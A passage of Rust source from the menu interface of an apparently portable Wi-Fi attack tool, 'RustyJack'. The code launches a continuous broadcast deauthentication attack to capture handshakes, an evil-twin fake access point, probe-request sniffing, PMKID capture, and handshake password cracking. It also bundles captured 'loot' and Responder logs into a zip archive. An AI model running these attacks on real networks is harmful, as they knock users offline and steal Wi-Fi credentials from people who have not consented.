        bail!("No USB storage drive found. Please insert a USB drive.")
    }
    
    /// Find USB block devices by checking /sys/block/ for removable USB devices
    fn find_usb_block_devices(&self) -> Vec<String> {
        let mut usb_devices = Vec::new();
        
        let sys_block = Path::new("/sys/block");
        if !sys_block.exists() {
            return usb_devices;
        }
        
        if let Ok(entries) = fs::read_dir(sys_block) {
            for entry in entries.flatten() {
                let name = entry.file_name().to_string_lossy().to_string();
                
                // Skip loop devices, ram disks, and mmcblk (SD cards - usually the boot drive)
                if name.starts_with("loop") || name.starts_with("ram") || name.starts_with("mmcblk") {
                    continue;
                }
                
                // Check if it's a removable device
                let removable_path = entry.path().join("removable");
                let is_removable = fs::read_to_string(&removable_path)
                    .map(|s| s.trim() == "1")
                    .unwrap_or(false);
                
                // Check if it's a USB device by looking at the device path
                let device_path = entry.path().join("device");
                let is_usb = if device_path.exists() {
                    // Follow symlink and check if path contains "usb"
                    fs::read_link(&device_path)
                        .map(|p| p.to_string_lossy().contains("usb"))
                        .unwrap_or(false)
                } else {
                    false
                };
                
                // Also check uevent for DRIVER=usb-storage
                let uevent_path = entry.path().join("device").join("uevent");
                let is_usb_storage = fs::read_to_string(&uevent_path)
                    .map(|s| s.contains("usb-storage") || s.contains("usb"))
                    .unwrap_or(false);
                
                if is_removable || is_usb || is_usb_storage {
                    // Make sure it has a size > 0 (actually a storage device)
                    let size_path = entry.path().join("size");
                    let has_size = fs::read_to_string(&size_path)
                        .map(|s| s.trim().parse::<u64>().unwrap_or(0) > 0)
                        .unwrap_or(false);
                    
                    if has_size {
                        usb_devices.push(name);
                    }
                }
            }
        }
        
        usb_devices
    }
    
    /// Read mount points from /proc/mounts
    fn read_mount_points(&self) -> Result<Vec<(String, String)>> {
        let contents = fs::read_to_string("/proc/mounts")
            .context("Failed to read /proc/mounts")?;
        
        let mut mounts = Vec::new();
        for line in contents.lines() {
            let parts: Vec<&str> = line.split_whitespace().collect();
            if parts.len() >= 2 {
                let device = parts[0].to_string();
                let mount_point = parts[1].to_string();
                
                // Only consider actual device mounts (not tmpfs, proc, etc.)
                if device.starts_with("/dev/") {
                    mounts.push((device, mount_point));
                }
            }
        }
        
        Ok(mounts)
    }
    
    /// Check if a path is likely a USB storage mount (not a WiFi dongle, etc.)
    fn is_usb_storage_mount(&self, path: &Path) -> bool {
        // Must be writable
        if !self.is_writable_mount(path) {
            return false;
        }
        
        // Check filesystem type - USB storage typically uses vfat, exfat, ntfs, ext4
        // This helps exclude pseudo-filesystems and network mounts
        let mount_path_str = path.to_string_lossy();
        
        if let Ok(contents) = fs::read_to_string("/proc/mounts") {
            for line in contents.lines() {
                if line.contains(&*mount_path_str) {
                    let parts: Vec<&str> = line.split_whitespace().collect();
                    if parts.len() >= 3 {
                        let fs_type = parts[2];
                        // Common USB storage filesystems
                        if matches!(fs_type, "vfat" | "exfat" | "ntfs" | "ntfs3" | "ext4" | "ext3" | "ext2" | "fuseblk") {
                            return true;
                        }
                    }
                }
            }
        }
        
        false
    }

    fn is_writable_mount(&self, path: &Path) -> bool {
        // Try to create a test file to verify write access
        let test_file = path.join(".rustyjack_test");
        if fs::write(&test_file, b"test").is_ok() {
            let _ = fs::remove_file(&test_file);
            true
        } else {
            false
        }
    }

    fn run_system_update(&mut self) -> Result<()> {
        let args = SystemUpdateArgs {
            service: "rustyjack".to_string(),
            remote: "origin".to_string(),
            branch: "main".to_string(),
            backup_dir: None,
        };

        let core = self.core.clone();
        let display = &mut self.display;
        let stats = &self.stats;

        let result = core.run_system_update_with_progress(args, |pct, task| {
            let status = stats.snapshot();
            let _ = display.draw_progress_dialog("System Update", task, pct, &status);
        });

        match result {
            Ok((_, data)) => {
                let backup = data
                    .get("backup_path")
                    .and_then(Value::as_str)
                    .unwrap_or("archive");
                let msg = vec!["Updated from git".to_string(), format!("Backup: {backup}")];
                self.show_message("Update", msg.iter().map(|s| s.as_str()))?;
            }
            Err(err) => {
                let msg = err.to_string();
                self.show_message("Update", [msg.as_str()])?;
            }
        }
        Ok(())
    }

    fn build_loot_archive(&self) -> Result<(TempPath, PathBuf)> {
        let mut temp = NamedTempFile::new()?;
        {
            let mut zip = ZipWriter::new(&mut temp);
            let options = FileOptions::default().compression_method(CompressionMethod::Deflated);
            self.add_directory_to_zip(&mut zip, &self.root.join("loot"), "loot/", options.clone())?;
            self.add_directory_to_zip(
                &mut zip,
                &self.root.join("Responder").join("logs"),
                "ResponderLogs/",
                options,
            )?;
            zip.finish()?;
        }
        let temp_path = temp.into_temp_path();
        let path = temp_path.to_path_buf();
        Ok((temp_path, path))
    }

    fn add_directory_to_zip(
        &self,
        zip: &mut ZipWriter<&mut NamedTempFile>,
        dir: &Path,
        prefix: &str,
        options: FileOptions,
    ) -> Result<()> {
        if !dir.exists() {
            return Ok(());
        }
        for entry in WalkDir::new(dir) {
            let entry = entry?;
            if entry.file_type().is_file() {
                let rel = entry.path().strip_prefix(dir).unwrap_or(entry.path());
                let mut name = PathBuf::from(prefix);
                name.push(rel);
                let name = name.to_string_lossy().replace('\\', "/");
                zip.start_file(name, options)?;
                let data = fs::read(entry.path())?;
                zip.write_all(&data)?;
            }
        }
        Ok(())
    }

    fn choose_interface_name(&mut self, title: &str, names: &[String]) -> Result<Option<String>> {
        if names.is_empty() {
            self.show_message("Interfaces", ["No interfaces detected"])?;
            return Ok(None);
        }
        let labels: Vec<String> = names.iter().map(|n| format!(" {n}")).collect();
        Ok(self
            .choose_from_list(title, &labels)?
            .map(|idx| names[idx].clone()))
    }

    fn toggle_discord(&mut self) -> Result<()> {
        self.config.settings.discord_enabled = !self.config.settings.discord_enabled;
        self.save_config()?;
        // No message needed as the menu label will update immediately
        Ok(())
    }
    
    fn show_hardware_detect(&mut self) -> Result<()> {
        self.show_progress("Hardware Scan", ["Detecting interfaces...", "Please wait"])?;
        
        match self.core.dispatch(Commands::Hardware(HardwareCommand::Detect)) {
            Ok((_, data)) => {
                let eth_count = data.get("ethernet_count").and_then(|v| v.as_u64()).unwrap_or(0);
                let wifi_count = data.get("wifi_count").and_then(|v| v.as_u64()).unwrap_or(0);
                let other_count = data.get("other_count").and_then(|v| v.as_u64()).unwrap_or(0);
                
                let ethernet_ports = data.get("ethernet_ports").and_then(|v| v.as_array()).cloned().unwrap_or_default();
                let wifi_modules = data.get("wifi_modules").and_then(|v| v.as_array()).cloned().unwrap_or_default();
                
                // Build list of detected interfaces (clickable)
                let mut all_interfaces = Vec::new();
                let mut labels = Vec::new();

                let active_interface = self.config.settings.active_network_interface.clone();
                
                for port in &ethernet_ports {
                    if let Some(name) = port.get("name").and_then(|v| v.as_str()) {
                        let label = if name == active_interface {
                            format!("{} *", name)
                        } else {
                            name.to_string()
                        };
                        labels.push(label);
                        all_interfaces.push(port.clone());
                    }
                }
                for module in &wifi_modules {
                    if let Some(name) = module.get("name").and_then(|v| v.as_str()) {
                        let label = if name == active_interface {
                            format!("{} *", name)
                        } else {
                            name.to_string()
                        };
                        labels.push(label);
                        all_interfaces.push(module.clone());
                    }
                }
                
                // If nothing to show, just present summary
                if all_interfaces.is_empty() {
                    let summary_lines = vec![
                        format!("Ethernet: {}", eth_count),
                        format!("WiFi: {}", wifi_count),
                        format!("Other: {}", other_count),
                    ];
                    self.show_message("Hardware Detected", summary_lines.iter().map(|s| s.as_str()))?;
                } else {
                    // Present clickable list and show details on selection
                    loop {
                        let Some(idx) = self.choose_from_menu("Detected interfaces", &labels)? else { break; };
                        
                        let info = &all_interfaces[idx];
                        let interface_name = info.get("name").and_then(|v| v.as_str()).unwrap_or("unknown").to_string();
                        
                        // Build detail lines
                        let mut details = Vec::new();
                        details.push(format!("Name: {}", interface_name));
                        if let Some(kind) = info.get("kind").and_then(|v| v.as_str()) { details.push(format!("Kind: {}", kind)); }
                        if let Some(state) = info.get("oper_state").and_then(|v| v.as_str()) { details.push(format!("State: {}", state)); }
                        if let Some(ip) = info.get("ip").and_then(|v| v.as_str()) { details.push(format!("IP: {}", ip)); }
                        details.push("".to_string());
                        details.push("[OK] Set Active".to_string());
                        
                        self.display.draw_menu("Interface details", &details, usize::MAX, &self.stats.snapshot())?;;
                        // Wait for action
                        loop {
                            let btn = self.buttons.wait_for_press()?;
                            match self.map_button(btn) {
                                ButtonAction::Select => {
                                    // Set this interface as active
                                    self.config.settings.active_network_interface = interface_name.clone();
                                    let config_path = self.root.join("gui_conf.json");
                                    if let Err(e) = self.config.save(&config_path) {
                                        self.show_message("Error", [format!("Failed to save: {}", e)])?;
                                    } else {
                                        self.show_message("Active Interface", [format!("Set to: {}", interface_name)])?;
                                    }
                                    // Refresh the labels to show new active indicator
                                    labels.clear();
                                    all_interfaces.clear();
                                    let active = self.config.settings.active_network_interface.clone();
                                    for port in &ethernet_ports {
                                        if let Some(name) = port.get("name").and_then(|v| v.as_str()) {
                                            let label = if name == active { format!("{} *", name) } else { name.to_string() };
                                            labels.push(label);
                                            all_interfaces.push(port.clone());
                                        }
                                    }
                                    for module in &wifi_modules {
                                        if let Some(name) = module.get("name").and_then(|v| v.as_str()) {
                                            let label = if name == active { format!("{} *", name) } else { name.to_string() };
                                            labels.push(label);
                                            all_interfaces.push(module.clone());
                                        }
                                    }
                                    break;
                                }
                                ButtonAction::Back => break,
                                ButtonAction::MainMenu => { self.menu_state.home(); break; }
                                ButtonAction::Reboot => { self.confirm_reboot()?; }
                                _ => {}
                            }
                        }
                    }
                }
            }
            Err(err) => {
                let msg = vec![format!("Scan failed: {}", err)];
                self.show_message("Hardware Error", msg.iter().map(|s| s.as_str()))?;
            }
        }
        Ok(())
    }
    
    fn scan_wifi_networks(&mut self) -> Result<()> {
        self.show_progress("WiFi Scan", ["Scanning for networks...", "Please wait"])?;
        
        let scan_result = self.fetch_wifi_scan();
        
        match scan_result {
            Ok(response) => {
                if response.networks.is_empty() {
                    return self.show_message("WiFi Scan", ["No networks found"]);
                }
                
                // Build list of networks for selection
                let networks = response.networks;
                let mut labels = Vec::new();
                for net in &networks {
                    let ssid = net.ssid.as_deref().unwrap_or("<hidden>");
                    // Truncate SSID if too long for display
                    let ssid_display = if ssid.len() > 10 {
                        format!("{}...", &ssid[..10])
                    } else {
                        ssid.to_string()
                    };
                    let signal = net.signal_dbm.map(|s| format!("{}dB", s)).unwrap_or_default();
                    let ch = net.channel.map(|c| format!("c{}", c)).unwrap_or_default();
                    let lock = if net.encrypted { "*" } else { "" };
                    labels.push(format!("{}{} {} {}", lock, ssid_display, signal, ch));
                }
                
                // Interactive network list - loop until user backs out
                loop {
                    let choice = self.choose_from_menu("Select Network", &labels)?;
                    match choice {
                        Some(idx) => {
                            if let Some(network) = networks.get(idx) {
                                self.handle_network_selection(network)?;
                            }
                        }
                        None => break, // User pressed back
                    }
                }
            }
            Err(e) => {
                self.show_message("WiFi Scan Error", [format!("{}", e)])?;
            }
        }
        
        Ok(())
    }
    
    fn launch_deauth_attack(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        let target_network = self.config.settings.target_network.clone();
        let target_bssid = self.config.settings.target_bssid.clone();
        let target_channel = self.config.settings.target_channel;
        
        // Validate we have all required target info
        if target_bssid.is_empty() {
            return self.show_message("Deauth Attack", [
                "No target BSSID set",
                "Scan networks first",
                "and select a target"
            ]);
        }
        
        if target_channel == 0 {
            return self.show_message("Deauth Attack", [
                "No target channel set",
                "Scan networks first",
                "and select a target"
            ]);
        }
        
        if active_interface.is_empty() {
            return self.show_message("Deauth Attack", [
                "No active interface",
                "Set in Hardware Detect"
            ]);
        }
        
        // Show attack configuration
        self.show_message("Deauth Attack", [
            &format!("Target: {}", if target_network.is_empty() { &target_bssid } else { &target_network }),
            &format!("BSSID: {}", target_bssid),
            &format!("Channel: {}", target_channel),
            &format!("Interface: {}", active_interface),
            "Duration: 120s",
            "Press SELECT to start"
        ])?;
        
        // Show progress stages for 120 second attack
        let progress_stages = vec![
            (0, "Killing processes..."),
            (2, "Monitor mode enabled"),
            (5, "Setting channel..."),
            (8, "Starting capture..."),
            (10, "Sending deauth burst"),
            (15, "Attack in progress..."),
            (30, "Monitoring for handshake"),
            (45, "Deauth burst sent..."),
            (60, "Halfway complete..."),
            (75, "Still capturing..."),
            (90, "Checking for handshake"),
            (100, "Attack continuing..."),
            (110, "Finalizing capture..."),
            (115, "Stopping monitor mode"),
        ];
        
        // Show initial message
        self.show_progress("Deauth Attack", [
            &format!("Target: {}", if target_network.is_empty() { &target_bssid } else { &target_network }),
            &format!("Channel: {} | {}", target_channel, active_interface),
            "Preparing attack...",
        ])?;
        
        // Launch attack in background thread while showing progress
        use std::sync::{Arc, Mutex};
        use std::thread;
        use std::time::Duration;
        
        let core = self.core.clone();
        let bssid = target_bssid.clone();
        let ssid = if target_network.is_empty() { None } else { Some(target_network.clone()) };
        let channel = target_channel;
        let iface = active_interface.clone();
        
        let result = Arc::new(Mutex::new(None));
        let result_clone = Arc::clone(&result);
        
        // Spawn attack thread
        thread::spawn(move || {
            let command = Commands::Wifi(WifiCommand::Deauth(WifiDeauthArgs {
                bssid,
                ssid,
                interface: iface,
                channel,
                duration: 120,      // 2 minutes for better handshake capture
                packets: 64,        // More packets per burst
                client: None,       // Broadcast to all clients
                continuous: true,   // Keep sending deauth throughout
                interval: 1,        // 1 second between bursts
            }));
            
            let r = core.dispatch(command);
            *result_clone.lock().unwrap() = Some(r);
        });
        
        // Show progress updates while attack runs (120 seconds)
        let attack_duration = 120u64;
        let start = std::time::Instant::now();
        let mut stage_idx = 0;
        
        loop {
            let elapsed = start.elapsed().as_secs();
            
            // Update stage
            while stage_idx < progress_stages.len() && elapsed >= progress_stages[stage_idx].0 {
                let overlay = self.stats.snapshot();
                self.display.draw_progress_dialog(
                    "Deauth Attack",
                    progress_stages[stage_idx].1,
                    (elapsed as f32 / attack_duration as f32) * 100.0,
                    &overlay,
                )?;
                stage_idx += 1;
            }
            
            // Check if attack completed
            if result.lock().unwrap().is_some() {
                break;
            }
            
            // Update display periodically
            if elapsed % 5 == 0 {
                let overlay = self.stats.snapshot();
                let message = if elapsed < attack_duration {
                    format!("Attack progress... {}s/{}s", elapsed, attack_duration)
                } else {
                    "Finalizing...".to_string()
                };
                self.display.draw_progress_dialog(
                    "Deauth Attack",
                    &message,
                    (elapsed as f32 / attack_duration as f32).min(1.0) * 100.0,
                    &overlay,
                )?;
            }
            
            thread::sleep(Duration::from_millis(500));
        }
        
        // Get result
        let attack_result = result.lock().unwrap().take().unwrap();
        
        match attack_result {
            Ok((msg, data)) => {
                let mut result_lines = vec![msg];
                
                if let Some(captured) = data.get("handshake_captured").and_then(|v| v.as_bool()) {
                    if captured {
                        result_lines.push("HANDSHAKE CAPTURED!".to_string());
                        if let Some(hf) = data.get("handshake_file").and_then(|v| v.as_str()) {
                            result_lines.push(format!("File: {}", Path::new(hf).file_name().unwrap().to_str().unwrap()));
                        }
                    } else {
                        result_lines.push("No handshake detected".to_string());
                    }
                }
                
                if let Some(packets) = data.get("total_packets_sent").and_then(|v| v.as_u64()) {
                    result_lines.push(format!("Packets: {}", packets));
                }
                
                if let Some(bursts) = data.get("deauth_bursts").and_then(|v| v.as_u64()) {
                    result_lines.push(format!("Bursts: {}", bursts));
                }
                
                if let Some(log) = data.get("log_file").and_then(|v| v.as_str()) {
                    result_lines.push(format!("Log: {}", Path::new(log).file_name().unwrap().to_str().unwrap()));
                }
                
                result_lines.push("Check Loot > Wireless".to_string());
                
                self.show_message("Deauth Complete", result_lines.iter().map(|s| s.as_str()))?;
            }
            Err(e) => {
                self.show_message("Deauth Error", [format!("{}", e)])?;
            }
        }
        
        Ok(())
    }
    
    fn connect_known_network(&mut self) -> Result<()> {
        // For now, show message that user should use WiFi Manager or CLI
        // A full text input UI would require keyboard support
        self.show_message("Connect Network", [
            "Use WiFi Manager to",
            "connect to networks",
            "",
            "Or use command line:",
            "rustyjack-core wifi",
            "profile connect",
        ])
    }
    
    fn launch_evil_twin(&mut self) -> Result<()> {
        // Check if we have a target set
        let target_network = self.config.settings.target_network.clone();
        let target_bssid = self.config.settings.target_bssid.clone();
        let target_channel = self.config.settings.target_channel;
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if target_network.is_empty() || target_bssid.is_empty() {
            return self.show_message("Evil Twin", [
                "No target network set",
                "",
                "First scan networks and",
                "select 'Set as Target'"
            ]);
        }
        
        if active_interface.is_empty() {
            return self.show_message("Evil Twin", [
                "No WiFi interface set",
                "",
                "Run Hardware Detect",
                "to configure interface"
            ]);
        }
        
        // Show attack configuration
        self.show_message("Evil Twin Attack", [
            &format!("SSID: {}", target_network),
            &format!("Channel: {}", target_channel),
            &format!("Interface: {}", active_interface),
            "",
            "Creates fake AP with",
            "same SSID to capture",
            "client connections",
            "",
            "Press SELECT to start"
        ])?;
        
        // Confirm start
        let options = vec!["Start Attack".to_string(), "Cancel".to_string()];
        let choice = self.choose_from_list("Confirm", &options)?;
        
        if choice != Some(0) {
            return Ok(());
        }
        
        // Show progress - in background start evil twin
        self.show_progress("Evil Twin", [
            &format!("Creating fake: {}", target_network),
            "Starting hostapd...",
        ])?;
        
        // Execute evil twin via core
        use rustyjack_core::{Commands, WifiCommand, WifiEvilTwinArgs};
        
        let cmd = Commands::Wifi(WifiCommand::EvilTwin(WifiEvilTwinArgs {
            ssid: target_network.clone(),
            target_bssid: Some(target_bssid),
            channel: target_channel,
            interface: active_interface,
            duration: 300, // 5 minutes
            open: true,
        }));
        
        match self.core.dispatch(cmd) {
            Ok((msg, data)) => {
                let mut lines = vec![msg];
                if let Some(clients) = data.get("clients_connected").and_then(|v| v.as_u64()) {
                    lines.push(format!("Clients: {}", clients));
                }
                if let Some(hs) = data.get("handshakes_captured").and_then(|v| v.as_u64()) {
                    lines.push(format!("Handshakes: {}", hs));
                }
                self.show_message("Evil Twin Done", lines.iter().map(|s| s.as_str()))?;
            }
            Err(e) => {
                self.show_message("Evil Twin Error", [format!("{}", e)])?;
            }
        }
        
        Ok(())
    }
    
    fn launch_probe_sniff(&mut self) -> Result<()> {
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("Probe Sniff", [
                "No WiFi interface set",
                "",
                "Run Hardware Detect",
                "to configure interface"
            ]);
        }
        
        // Duration selection
        let durations = vec![
            "30 seconds".to_string(),
            "1 minute".to_string(),
            "5 minutes".to_string(),
        ];
        let dur_choice = self.choose_from_list("Sniff Duration", &durations)?;
        
        let duration_secs = match dur_choice {
            Some(0) => 30,
            Some(1) => 60,
            Some(2) => 300,
            _ => return Ok(()),
        };
        
        self.show_progress("Probe Sniff", [
            "Capturing probe requests",
            "from nearby devices...",
        ])?;
        
        use rustyjack_core::{Commands, WifiCommand, WifiProbeSniffArgs};
        
        let cmd = Commands::Wifi(WifiCommand::ProbeSniff(WifiProbeSniffArgs {
            interface: active_interface,
            duration: duration_secs,
            channel: 0, // hop channels
        }));
        
        match self.core.dispatch(cmd) {
            Ok((msg, data)) => {
                let mut lines = vec![msg];
                
                if let Some(probes) = data.get("total_probes").and_then(|v| v.as_u64()) {
                    lines.push(format!("Probes: {}", probes));
                }
                if let Some(clients) = data.get("unique_clients").and_then(|v| v.as_u64()) {
                    lines.push(format!("Clients: {}", clients));
                }
                if let Some(networks) = data.get("unique_networks").and_then(|v| v.as_u64()) {
                    lines.push(format!("Networks: {}", networks));
                }
                
                // Show top probed networks
                if let Some(top) = data.get("top_networks").and_then(|v| v.as_array()) {
                    lines.push("".to_string());
                    lines.push("Top Networks:".to_string());
                    for net in top.iter().take(3) {
                        if let Some(ssid) = net.get("ssid").and_then(|v| v.as_str()) {
                            let count = net.get("probe_count").and_then(|v| v.as_u64()).unwrap_or(0);
                            lines.push(format!("  {} ({})", ssid, count));
                        }
                    }
                }
                
                self.show_message("Probe Sniff Done", lines.iter().map(|s| s.as_str()))?;
            }
            Err(e) => {
                self.show_message("Probe Error", [format!("{}", e)])?;
            }
        }
        
        Ok(())
    }
    
    fn launch_pmkid_capture(&mut self) -> Result<()> {
        let target_network = self.config.settings.target_network.clone();
        let target_bssid = self.config.settings.target_bssid.clone();
        let target_channel = self.config.settings.target_channel;
        let active_interface = self.config.settings.active_network_interface.clone();
        
        if active_interface.is_empty() {
            return self.show_message("PMKID Capture", [
                "No WiFi interface set",
                "",
                "Run Hardware Detect first"
            ]);
        }
        
        // Option to target specific network or passive capture
        let options = vec![
            if target_network.is_empty() {
                "Passive Capture".to_string()
            } else {
                format!("Target: {}", target_network)
            },
            "Passive (any network)".to_string(),
            "Cancel".to_string(),
        ];
        
        let choice = self.choose_from_list("PMKID Mode", &options)?;
        
        let (use_target, duration) = match choice {
            Some(0) if !target_network.is_empty() => (true, 30),
            Some(1) | Some(0) => (false, 60),
            _ => return Ok(()),
        };
        
        self.show_progress("PMKID Capture", [
            if use_target { "Targeting network..." } else { "Passive capture..." },
            "No deauth needed!",
        ])?;
        
        use rustyjack_core::{Commands, WifiCommand, WifiPmkidArgs};
        
        let cmd = Commands::Wifi(WifiCommand::PmkidCapture(WifiPmkidArgs {
            interface: active_interface,
            bssid: if use_target { Some(target_bssid) } else { None },
            ssid: if use_target { Some(target_network) } else { None },
            channel: if use_target { target_channel } else { 0 },
            duration,
        }));
        
        match self.core.dispatch(cmd) {
            Ok((msg, data)) => {
                let mut lines = vec![msg];
                
                if let Some(count) = data.get("pmkids_captured").and_then(|v| v.as_u64()) {
                    if count > 0 {
                        lines.push(format!("Captured: {} PMKIDs", count));
                        lines.push("".to_string());
                        lines.push("Auto-cracking...".to_string());
                        
                        // If PMKID was captured, trigger auto-crack
                        if let Some(hashcat) = data.get("hashcat_format").and_then(|v| v.as_str()) {
                            lines.push(format!("Hash saved for cracking"));
                        }
                    } else {
                        lines.push("No PMKIDs found".to_string());
                        lines.push("Try different network".to_string());
                    }
                }
                
                self.show_message("PMKID Result", lines.iter().map(|s| s.as_str()))?;
            }
            Err(e) => {
                self.show_message("PMKID Error", [format!("{}", e)])?;
            }
        }
        
        Ok(())
    }
    
    fn launch_crack_handshake(&mut self) -> Result<()> {
        // Look for captured handshakes in loot directory
        let loot_dir = self.root.join("loot/Wireless");
        
        if !loot_dir.exists() {
            return self.show_message("Crack", [
                "No handshakes found",
                "",
                "Capture a handshake",
                "using Deauth Attack",
                "or PMKID Capture first"
            ]);
        }
        
        // Find .hc22000 or .cap files
        let mut handshake_files = Vec::new();
        if let Ok(entries) = std::fs::read_dir(&loot_dir) {
            for entry in entries.flatten() {
                let path = entry.path();
                if let Some(ext) = path.extension() {
                    if ext == "hc22000" || ext == "cap" || ext == "pcap" {
                        if let Some(name) = path.file_name() {
                            handshake_files.push(name.to_string_lossy().to_string());
                        }
                    }
                }
            }
        }
        
        if handshake_files.is_empty() {
            return self.show_message("Crack", [
                "No handshakes found",
                "in loot/Wireless",
                "",
                "Capture one first"
            ]);
        }
        
        // Let user select which to crack
        let choice = self.choose_from_menu("Select Handshake", &handshake_files)?;
        
        let Some(idx) = choice else {
            return Ok(());
        };
        
        let selected_file = &handshake_files[idx];
        let file_path = loot_dir.join(selected_file);
        
        // Crack method selection
        let methods = vec![
            "Quick (common)".to_string(),
            "8-digit PINs".to_string(),
            "SSID patterns".to_string(),
        ];
        
        let method = self.choose_from_list("Crack Method", &methods)?;
        
        let crack_mode = match method {
            Some(0) => "quick",
            Some(1) => "pins",
            Some(2) => "ssid",
            _ => return Ok(()),
        };
        
        self.show_progress("Cracking", [
            &format!("File: {}", selected_file),
            "This may take a while...",
        ])?;
        
        use rustyjack_core::{Commands, WifiCommand, WifiCrackArgs};
        
        let cmd = Commands::Wifi(WifiCommand::Crack(WifiCrackArgs {
            file: file_path.to_string_lossy().to_string(),
            mode: crack_mode.to_string(),
            ssid: None,
            wordlist: None,
        }));
        
        match self.core.dispatch(cmd) {
            Ok((msg, data)) => {
                let mut lines = vec![msg];
                
                if let Some(password) = data.get("password").and_then(|v| v.as_str()) {
                    lines.push("".to_string());
                    lines.push("PASSWORD FOUND!".to_string());
                    lines.push(format!("{}", password));
                } else {
                    if let Some(attempts) = data.get("attempts").and_then(|v| v.as_u64()) {
                        lines.push(format!("Tried: {} passwords", attempts));
                    }
                    lines.push("No match found".to_string());
                    lines.push("Try different method".to_string());
                }
                
                self.show_message("Crack Result", lines.iter().map(|s| s.as_str()))?;
            }
            Err(e) => {
                self.show_message("Crack Error", [format!("{}", e)])?;
            }
        }
        
        Ok(())
    }
    
    /// Install WiFi drivers for USB dongles
    /// Keeps user on screen until installation completes or fails
    fn install_wifi_drivers(&mut self) -> Result<()> {
        use std::fs;
        use std::io::{BufRead, BufReader};
        use std::process::{Command, Stdio};
        
        // Status file used by the driver installer script
        let status_file = Path::new("/tmp/rustyjack_wifi_status");
        let result_file = Path::new("/tmp/rustyjack_wifi_result.json");
        let script_path = self.root.join("scripts/wifi_driver_installer.sh");
        
        // Check if script exists
        if !script_path.exists() {
            return self.show_message("Driver Install", [
                "Installer script not found",
                "",
                "Missing:",
                "scripts/wifi_driver_installer.sh",
                "",
                "Please reinstall RustyJack"
            ]);
        }
        
        // Initial screen - explain what we're doing
        self.show_message("WiFi Driver Install", [
            "This will scan for USB WiFi",
            "adapters and install any",
            "required drivers.",
            "",
            "Internet required for",
            "driver downloads.",
            "",
            "Press SELECT to continue"
        ])?;
        
        // Confirm
        let options = vec!["Start Scan".to_string(), "Cancel".to_string()];
        let choice = self.choose_from_list("Install Drivers?", &options)?;
        
        if choice != Some(0) {
            return Ok(());
        }
        
        // Clear old status files
        let _ = fs::remove_file(status_file);
        let _ = fs::remove_file(result_file);
        
        // Show initial scanning message
        self.show_progress("WiFi Driver", ["Scanning for USB WiFi...", "Please wait"])?;
        
        // Run the installer script
        let mut child = match Command::new("bash")
            .arg(&script_path)
            .stdout(Stdio::piped())
            .stderr(Stdio::piped())
            .spawn() {
                Ok(c) => c,
                Err(e) => {
                    return self.show_message("Driver Error", [
                        "Failed to start installer",
                        "",
                        &format!("{}", e)
                    ]);
                }
            };
        
        // Monitor progress
        let mut last_status = String::new();
        let mut ticks = 0;
        
        loop {
            // Check if process finished
            match child.try_wait() {
                Ok(Some(status)) => {
                    // Process finished - check result
                    let exit_code = status.code().unwrap_or(-1);
                    
                    // Read final result
                    if let Ok(result_json) = fs::read_to_string(result_file) {
                        if let Ok(result) = serde_json::from_str::<Value>(&result_json) {
                            let status = result.get("status").and_then(|v| v.as_str()).unwrap_or("UNKNOWN");
                            let details = result.get("details").and_then(|v| v.as_str()).unwrap_or("");
                            let interfaces = result.get("interfaces").and_then(|v| v.as_array());
                            
                            match status {
                                "SUCCESS" => {
                                    let mut lines = vec![
                                        "Driver installed!".to_string(),
                                        "".to_string(),
                                    ];
                                    if let Some(ifaces) = interfaces {
                                        lines.push("Available interfaces:".to_string());
                                        for iface in ifaces {
                                            if let Some(name) = iface.as_str() {
                                                lines.push(format!("  - {}", name));
                                            }
                                        }
                                    }
                                    lines.push("".to_string());
                                    lines.push("Ready to use!".to_string());
                                    
                                    return self.show_message("Driver Success", lines.iter().map(|s| s.as_str()));
                                }
                                "REBOOT_REQUIRED" => {
                                    return self.show_message("Reboot Required", [
                                        "Driver installed but",
                                        "reboot is required.",
                                        "",
                                        "Please restart the",
                                        "device to complete",
                                        "installation.",
                                        "",
                                        "Press KEY3 to reboot"
                                    ]);
                                }
                                "NO_DEVICES" => {
                                    return self.show_message("No Devices", [
                                        "No USB WiFi adapters",
                                        "were detected.",
                                        "",
                                        "Please plug in a USB",
                                        "WiFi adapter and try",
                                        "again."
                                    ]);
                                }
                                "FAILED" => {
                                    return self.show_message("Driver Failed", [
                                        "Failed to install drivers",
                                        "",
                                        details,
                                        "",
                                        "Check internet connection",
                                        "and try again.",
                                        "",
                                        "Some adapters may not",
                                        "be supported."
                                    ]);
                                }
                                _ => {
                                    return self.show_message("Unknown Result", [
                                        &format!("Status: {}", status),
                                        details
                                    ]);
                                }
                            }
                        }
                    }
                    
                    // No result file - use exit code
                    if exit_code == 0 {
                        return self.show_message("Driver Install", ["Installation completed"]);
                    } else if exit_code == 2 {
                        return self.show_message("Reboot Required", [
                            "Driver installed.",
                            "Reboot required to",
                            "complete setup.",
                            "",
                            "Press KEY3 to reboot"
                        ]);
                    } else {
                        return self.show_message("Driver Failed", [
                            "Installation failed",
                            "",
                            &format!("Exit code: {}", exit_code),
                            "",
                            "Check logs at:",
                            "/var/log/rustyjack_wifi_driver.log"
                        ]);
                    }
                }
                Ok(None) => {
                    // Still running - update status display
                    if let Ok(status) = fs::read_to_string(status_file) {
                        let status = status.trim();
                        if status != last_status {
                            last_status = status.to_string();
                            
                            // Parse status and show appropriate message
                            let (title, messages) = self.parse_driver_status(&last_status, ticks);
                            self.display.draw_menu(&title, &messages, usize::MAX, &self.stats.snapshot())?;
                        }
                    }
                    
                    // Animate waiting indicator
                    ticks += 1;
                    thread::sleep(Duration::from_millis(500));
                    
                    // Check for user cancel (back button)
                    if let Ok(Some(btn)) = self.buttons.try_read() {
                        if matches!(self.map_button(btn), ButtonAction::Back) {
                            // User cancelled - try to kill process
                            let _ = child.kill();
                            return self.show_message("Cancelled", ["Installation cancelled by user"]);
                        }
                    }
                }
                Err(e) => {
                    return self.show_message("Error", [
                        "Failed to check process",
                        &format!("{}", e)
                    ]);
                }
            }
        }
    }
    
    /// Parse driver installer status into display messages
    fn parse_driver_status(&self, status: &str, ticks: u32) -> (String, Vec<String>) {
        let spinner = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"][(ticks as usize) % 10];
        
        let parts: Vec<&str> = status.split(':').collect();
        
        match parts.get(0).map(|s| *s) {
            Some("SCANNING") => (
                "WiFi Driver".to_string(),
                vec![
                    format!("{} Scanning USB devices...", spinner),
                    "".to_string(),
